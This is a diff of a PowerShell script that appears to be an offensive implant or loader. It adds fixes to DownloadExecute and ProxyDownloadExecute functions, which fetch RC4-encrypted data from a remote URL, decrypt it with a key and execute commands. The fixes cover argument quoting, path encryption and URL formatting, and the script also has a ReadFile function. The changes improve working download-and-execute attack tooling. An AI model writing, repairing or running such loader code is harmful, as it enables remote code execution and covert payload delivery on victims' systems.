@@ -76,7 +76,7 @@ function Parse-Command {
                     
         } elseif($Args[0].ToLower().Equals("remote")) {
             if($Args.Length -ge 3) {
-                $Output = "DownloadExecute -Url '$($Args[1])' -Cmd '$($Args[2])' -Key $($Key)"
+                $Output = "DownloadExecute -Url '$($Args[1])' -Cmd '$($Args[2])' -Key '$($Key)'"
             } else {
                 $Output = "Show-Help -ErrorMessage 'Missing arguments'"
             }
@@ -84,7 +84,7 @@ function Parse-Command {
         } elseif($Args[0].ToLower().Equals("proxyremote")) {
             $Args = $CmdArgs.Split(" ", 4, [System.StringSplitOptions]::RemoveEmptyEntries)
             if($Args.Length -ge 4) {
-                $Output = "ProxyDownloadExecute -Url '$($Args[1])' -Path '$($Args[2])'-Cmd '$($Args[3])' -Key $($Key)"
+                $Output = "ProxyDownloadExecute -Url '$($Args[1])' -Path '$($Args[2])'-Cmd '$($Args[3])' -Key '$($Key)'"
             } else {
                 $Output = "Show-Help -ErrorMessage 'Missing arguments'"
             }
@@ -220,7 +220,7 @@ function DownloadToDisk {
 		} Catch {
 		    Display-Message -Module $moduleName -Message "failed to download $($Url)"
 		}
-		}
+	}
 
     END {
         Display-Message -Module $moduleName -Message "execution Completed"
@@ -277,13 +277,13 @@ function ProxyDownloadExecute {
 
     BEGIN {
         $moduleName = "ProxyDownloadExecute"
-	Display-Message -Module $moduleName -Message "Fetching $($Path)"
+	    Display-Message -Module $moduleName -Message "Fetching $($Path)"
         Display-Message -Module $moduleName -Message "Proxying through $($Url)"
     }
 
     PROCESS {
-        $encryptedPath = ($Path | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
-        $Url = $Url + "?" + [Convert]::ToBase64String($encryptedPath)
+        $encryptedPath = ([Text.Encoding]::ASCII.GetBytes($Path) | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
+        $Url = $Url + "/?" + ([Convert]::ToBase64String($encryptedPath))
         Try {
             $data = (New-Object Net.WebClient).DownloadData($Url)
             $buffer = ($data | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
@@ -311,7 +311,7 @@ function ReadFile {
 
     BEGIN {
         $moduleName = "ReadFile"
-		Display-Message -Module $moduleName -Message "Reading $($Path)"
+	Display-Message -Module $moduleName -Message "Reading $($Path)"
         $buffer = Get-Content $Path
         Write-Output $buffer
     }
